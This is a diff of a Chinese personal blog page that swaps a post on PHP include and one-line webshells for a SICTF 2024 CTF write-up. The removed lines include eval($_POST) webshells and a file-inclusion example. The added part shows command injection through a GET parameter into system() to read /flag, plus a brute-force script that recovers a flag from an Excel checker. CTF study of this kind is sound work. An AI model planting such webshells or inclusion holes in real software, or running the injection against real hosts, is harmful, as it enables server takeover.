@@ -19,22 +19,27 @@
   <meta name="author" content="fogpost">
   <meta name="keywords" content="">
   
-    <meta name="description" content="了解一下php的include函数顺便了解一句话木马的各种形式 include函数在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。 1234&lt;?phpinclude &#x27;test.php&#x27;;echo &#x27;hello world&#x27;;?&gt; 如果test.php不存在，则会抛出一个警告，但程序会继续">
+    <meta name="description" content="webSigin打开网页后出现这个页面典型的robots协议，访问robots.txt按照提示进入，发现一下界面在本地弄一个php环境跑一下出了这个  system(get_deined_vars()[_GET)][W3lc0me_t0_SICTF.2024])    简单来说就是将W3lc0me_t0_SICTF.2024作为system的get参数，多亏了有蒋✌教,这里存在一个php特性就是不">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php一句话木马">
-<meta property="og:url" content="https://fogpost.top/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/index.html">
+<meta property="og:title" content="sicctfwp">
+<meta property="og:url" content="https://fogpost.top/2024/11/01/sicctfwp/index.html">
 <meta property="og:site_name" content="fogpost&#96;s little blog">
-<meta property="og:description" content="了解一下php的include函数顺便了解一句话木马的各种形式 include函数在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。 1234&lt;?phpinclude &#x27;test.php&#x27;;echo &#x27;hello world&#x27;;?&gt; 如果test.php不存在，则会抛出一个警告，但程序会继续">
+<meta property="og:description" content="webSigin打开网页后出现这个页面典型的robots协议，访问robots.txt按照提示进入，发现一下界面在本地弄一个php环境跑一下出了这个  system(get_deined_vars()[_GET)][W3lc0me_t0_SICTF.2024])    简单来说就是将W3lc0me_t0_SICTF.2024作为system的get参数，多亏了有蒋✌教,这里存在一个php特性就是不">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-10-09T02:52:03.000Z">
-<meta property="article:modified_time" content="2024-10-30T06:51:21.728Z">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411012216221.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411012217411.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411012230759.png">
+<meta property="og:image" content="https://gitee.com/fogpost/photo/raw/master/202411012231237.png">
+<meta property="article:published_time" content="2024-11-01T14:15:18.000Z">
+<meta property="article:modified_time" content="2024-11-01T15:28:26.396Z">
 <meta property="article:author" content="fogpost">
-<meta property="article:tag" content="php">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/fogpost/photo/raw/master/202411012216221.png">
   
   
   
-  <title>php一句话木马 - fogpost`s little blog</title>
+  <title>sicctfwp - fogpost`s little blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +205,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="php一句话木马"></span>
+            <span id="subtitle" data-typed-text="sicctfwp"></span>
           
         </div>
 
@@ -211,8 +216,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-09 10:52" pubdate>
-          2024年10月9日 上午
+        <time datetime="2024-11-01 22:15" pubdate>
+          2024年11月1日 晚上
         </time>
       </span>
     
@@ -223,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          221 字
+          548 字
         
       </span>
     
@@ -234,7 +239,7 @@
         
         
         
-          2 分钟
+          5 分钟
         
       </span>
     
@@ -271,21 +276,37 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">php一句话木马</h1>
+            <h1 id="seo-header">sicctfwp</h1>
             
             
               <div class="markdown-body">
                 
-                <p>了解一下php的include函数顺便了解一句话木马的各种形式</p>
-<h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>在php中，include函数用于引入一个文件，如果引入的文件不存在，则会抛出一个警告，但程序会继续执行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-<p>如果test.php不存在，则会抛出一个警告，但程序会继续执行，输出hello world。<br>我们也可以在文件中定义动态的文件名</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$NSS</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$NSS</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
-
-<h2 id="木马举例"><a href="#木马举例" class="headerlink" title="木马举例"></a>木马举例</h2><blockquote>
-<?php @eval($_POST['cmd']); ?>
-<?php @eval($_POST[1]); ?><p>,简析一下这两马效果是一样的，但是数字与字符串的区别在于是否需要增加引号<br>一句话木马通常使用 POST 请求而不是 GET，因为 get传参有限制，在对某些waf进行垃圾数据填充时不方便，无法构造畸形的数据包</p>
+                <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Sigin"><a href="#Sigin" class="headerlink" title="Sigin"></a>Sigin</h2><p>打开网页后出现这个页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012216221.png" srcset="/img/loading.gif" lazyload><br>典型的robots协议，访问robots.txt<br>按照提示进入，发现一下界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012217411.png" srcset="/img/loading.gif" lazyload><br>在本地弄一个php环境跑一下出了这个</p>
+<blockquote>
+<p>system(get_deined_vars()[_GET)][W3lc0me_t0_SICTF.2024])  </p>
 </blockquote>
+<p>简单来说就是将W3lc0me_t0_SICTF.2024作为system的get参数，多亏了有蒋✌教,这里存在一个php特性就是不能过多的下划线要改为W3lc0me_t0[SICTF.2024这个才行</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://27.25.151.29:33218/wh3re_1s_thi5_fl4g.php?W3lc0me_t0%5BSICTF.2024=cat">http://27.25.151.29:33218/wh3re_1s_thi5_fl4g.php?W3lc0me_t0[SICTF.2024=cat</a> &#x2F;flag<br>SICTF{e79dbf83-bce6-4545-a9d7-53c527f3f13c} </p>
+</blockquote>
+<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="Exc"><a href="#Exc" class="headerlink" title="Exc??"></a>Exc??</h2><p>感觉和之前moectf的一个很像，直接打开看看<br>将这个xlsx分为一下几个模块</p>
+<ul>
+<li>输入输出模块<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012230759.png" srcset="/img/loading.gif" lazyload></li>
+<li>算法模块<br><img src="https://gitee.com/fogpost/photo/raw/master/202411012231237.png" srcset="/img/loading.gif" lazyload><br>先看wrong格中的内容<blockquote>
+<p>IF(C3&#x3D;D19,IF(F3&#x3D;G19,IF(I3&#x3D;J19,IF(L3&#x3D;D21,IF(O3&#x3D;G21,IF(R3&#x3D;J21,IF(U3&#x3D;D23,IF(X3&#x3D;G23,IF(AA3&#x3D;J23,</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>IF(D13&#x3D;Q19,IF(G13&#x3D;T19,IF(J13&#x3D;W19,IF(D15&#x3D;Q21,IF(G15&#x3D;T21,IF(J15&#x3D;W21,IF(D17&#x3D;Q23,IF(G17&#x3D;T23,IF(J17&#x3D;W23,</p>
+</blockquote>
+<blockquote>
+<p>IF(D31&#x3D;AT10,IF(G31&#x3D;AW10,IF(J31&#x3D;AZ10,IF(M31&#x3D;AT12,IF(P31&#x3D;AW12,IF(S31&#x3D;AZ12,IF(V31&#x3D;AT14,IF(Y31&#x3D;AW14,IF(AB31&#x3D;AZ14,”Accepted!”)))))))))))))))))))))))))))</p>
+</blockquote>
+<p>发现存在一个accpted，去找这个实现条件，发现是输入输出模块中的数要与算法模块中的紫色数据块相同<br>继续找紫色output的实现函数<br>分别如下<br>&#x3D;BITLSHIFT(CODE(C2),3)+BITLSHIFT(CODE(D2),4)+BITLSHIFT(CODE(E2),5)<br>第二个是<br>&#x3D;CODE(C2)*3+CODE(D2)*4+CODE(E2)*5<br>第三个是<br>&#x3D;CODE(C2)*CODE(D2)+CODE(D2)*CODE(E2)+CODE(E2)*CODE(C2)</p>
+<p>解释一下几个函数<br>BITLSHIFT(number, shift_amount)：执行左移操作<br>CODE(text)：将文本转换为ASCII码</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py">enc = [<span class="hljs-number">3976</span>, <span class="hljs-number">5728</span>, <span class="hljs-number">5640</span>, <span class="hljs-number">4232</span>, <span class="hljs-number">5272</span>, <span class="hljs-number">3776</span>, <span class="hljs-number">6464</span>, <span class="hljs-number">6136</span>, <span class="hljs-number">5408</span>]<br>enc1 = [<span class="hljs-number">876</span>, <span class="hljs-number">1147</span>, <span class="hljs-number">1182</span>, <span class="hljs-number">824</span>, <span class="hljs-number">1082</span>, <span class="hljs-number">866</span>, <span class="hljs-number">1361</span>, <span class="hljs-number">1278</span>, <span class="hljs-number">1087</span>]<br>enc2 = [<span class="hljs-number">16511</span>, <span class="hljs-number">24822</span>, <span class="hljs-number">26991</span>, <span class="hljs-number">11999</span>, <span class="hljs-number">21215</span>, <span class="hljs-number">16374</span>, <span class="hljs-number">37800</span>, <span class="hljs-number">32739</span>, <span class="hljs-number">21505</span>]<br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">9</span>):<br>    found = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 初始化找到标志</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>):<br>                <span class="hljs-comment"># 使用 and 代替 &amp;</span><br>                <span class="hljs-keyword">if</span> (i * <span class="hljs-number">8</span> + j * <span class="hljs-number">16</span> + k * <span class="hljs-number">32</span> == enc[l] <span class="hljs-keyword">and</span> <br>                    i * <span class="hljs-number">3</span> + j * <span class="hljs-number">4</span> + k * <span class="hljs-number">5</span> == enc1[l] <span class="hljs-keyword">and</span> <br>                    i * j + j * k + k * i == enc2[l]):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(i)&#125;</span><span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(j)&#125;</span><span class="hljs-subst">&#123;<span class="hljs-built_in">chr</span>(k)&#125;</span>&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>                    found = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 设置找到标志</span><br>                    <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 跳出内层循环</span><br>            <span class="hljs-keyword">if</span> found:  <span class="hljs-comment"># 如果找到匹配，则跳出中间循环</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> found:  <span class="hljs-comment"># 如果找到匹配，则跳出外层循环</span><br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
+<p>SICTF{Exc31_1s_r3@lly_fun!}</p>
 
                 
               </div>
@@ -304,7 +325,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%BD%91%E7%BB%9C/" class="category-chain-item">网络</a>
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
   
   
 
@@ -319,7 +340,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/php/" class="print-no-link">#php</a>
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
       
     </div>
   
@@ -331,8 +352,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>php一句话木马</div>
-      <div>https://fogpost.top/2024/10/09/php一句话木马/</div>
+      <div>sicctfwp</div>
+      <div>https://fogpost.top/2024/11/01/sicctfwp/</div>
     </div>
     <div class="license-meta">
       
@@ -344,7 +365,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月9日</div>
+          <div>2024年11月1日</div>
         </div>
       
       
@@ -376,18 +397,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/15/wuai%E7%AC%AC%E5%85%AB%E8%AF%BE/" title="wuai第八课">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">wuai第八课</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/06/sqli%E7%BB%83%E4%B9%A0/" title="sqli练习">
-                        <span class="hidden-mobile">sqli练习</span>
+                      <a href="/2024/10/31/nssctf2024%E7%A7%8B%E5%AD%A3%E5%9B%9E%E9%A1%BE/" title="nssctf2024秋季回顾">
+                        <span class="hidden-mobile">nssctf2024秋季回顾</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
